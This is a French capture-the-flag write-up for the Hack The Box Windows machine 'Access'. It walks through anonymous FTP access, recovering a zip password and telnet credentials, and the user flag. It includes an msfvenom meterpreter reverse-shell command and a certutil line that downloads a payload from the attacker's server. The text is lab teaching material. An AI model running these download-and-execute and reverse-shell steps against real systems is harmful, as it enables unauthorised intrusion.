# Access

- Machine Windows
- @IP : `10.10.10.98`

# Reconnaissance 

- Application web sur le port 80
- Sources : rien
- Headers : rien
- Echanges réseau : rien
- Scripts client : rien

Scan réseau :

    nmap -sV 10.10.10.98

    PORT   STATE SERVICE
    21/tcp open  ftp (Microsoft ftpd)
    23/tcp open  telnet
    80/tcp open  http (Microsoft IIS httpd 7.5)

    nmap -sS -PN -n -sV -sC 10.10.10.98

    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     Microsoft ftpd
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    |_Can't get directory listing: TIMEOUT
    | ftp-syst: 
    |_  SYST: Windows_NT
    23/tcp open  telnet?
    80/tcp open  http    Microsoft IIS httpd 7.5
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/7.5
    |_http-title: MegaCorp
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Répertoires web trouvés :

msf > auxiliary/scanner/http/dir_scanner :

    Found http://10.10.10.98:80/aspnet_client/ 403 (10.10.10.98)

dirb http://10.10.10.98

    10.10.10.98/index.html
    10.10.10.98/aspnet_client
    10.10.10.98/aspnet_client/system_web/

msf > auxiliary/scanner/http/webdav_scanner :

    [*] 10.10.10.98 (Microsoft-IIS/7.5) WebDAV disabled.

## Exploitation

### Serveur FTP
On sait grâce aux scans NMAP qu'un service FTP est lancé sur la machine cible.
On sait également que le login en tant qu'utilisation Anonymous est autorisé, on va donc tester de se connecter au serveur pour vérifier le contenu : 

    ftp 10.10.10.98
    Name: anonymous
    Password : <vide>

La connexion est autorisée, et on peut lister le contenu :

    ftp> ls
    200 PORT command successful.
    125 Data connection already open; Transfer starting.
    08-23-18  08:16PM       <DIR>          Backups
    08-24-18  09:00PM       <DIR>          Engineer

On récupère deux fichiers dans ces différents répertoires :
- Access Control.zip
- backup.mdb

```
file backup.mdb
backup.mdb: Microsoft Access Database
```

Tentative de cracker le fichier zip avec fcrackzip, ne donne rien :
```
fcrackzip -u -D -p ~/rockyou.txt AccessControl.zip
```
Affichage des chaines de caractères dans le fichier backup.mdb

`strings backup.mdb | awk 'length > 8' > dumpdb` 

On remarque la chaine de caractères : `access4u@security`

Ouverture du zip avec le mot de passe pour obtenir le fichier AccessControl.pst

Archive pst (Outlook), que l'on peut ouvrir avec `readpst AccessControl.pst`

Le mail contenu dans le .pst contient les credentials : 'security:4Cc3ssC0ntr0ller'

telnet 10.10.10.98
login:security
password:4Cc3ssC0ntr0ller

On accède au serveur en tant que l'utilisateur 'security'

Affichage du flag user :
```
cd Desktop
type user.txt
```

Le flag utilisateur est le hash : `ff1f3b48913b213a31ff6756d2553d38`

## Obtenir un shell meterpreter

L'objectif est de déposer un payload sur la machine en se servant de l'accès utilisateur dont on dispose.

Pour commencer on fabrique le payload que l'on executera :
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.13.129 LPORT=4567 -f exe > shell.exe`

On doit ensuite réussir à envoyer ce fichier sur la machine cible, on peut notamment utiliser l'utilitaire windows `certutil` qui sert habituellement à effectuer un certain nombre d'opérations sur les certificats d'une machine windows mais qui permet également de télécharger des fichiers via le protocole HTTP.

1. On crée un serveur web HTTP via `python -m SimpleHTTPServer` (par défaut sur le port 8000) dans le répertoire contenant le payload
2. Depuis la machine cible, on exécuté 
```
certutil -urlcache -split -f http://10.10.13.153:8000/coquillage.ps1 aaa.ps1
``` 
pour télécharger le fichier payload en local
3. On lance un handler de payload via msf (exploit/multi/handler) en prenant soin de renseigner le payload choisi, le port et l'adresse de la machine attaquante
4. on exécute le payload récupéré sur la machine cible
5. Le shell doit avoir pop dans msf

# Ressources 
https://blog.ropnop.com/using-credentials-to-own-windows-boxes/

https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/

https://github.com/SecureAuthCorp/impacket

https://forum.hackthebox.eu/discussion/1135/access/p7

http://hackingandsecurity.blogspot.com/2016/08/using-credentials-to-own-windows-boxes_17.html

http://hackingandsecurity.blogspot.com/2016/08/using-credentials-to-own-windows-boxes_99.html

https://www.computerhope.com/runas.htm
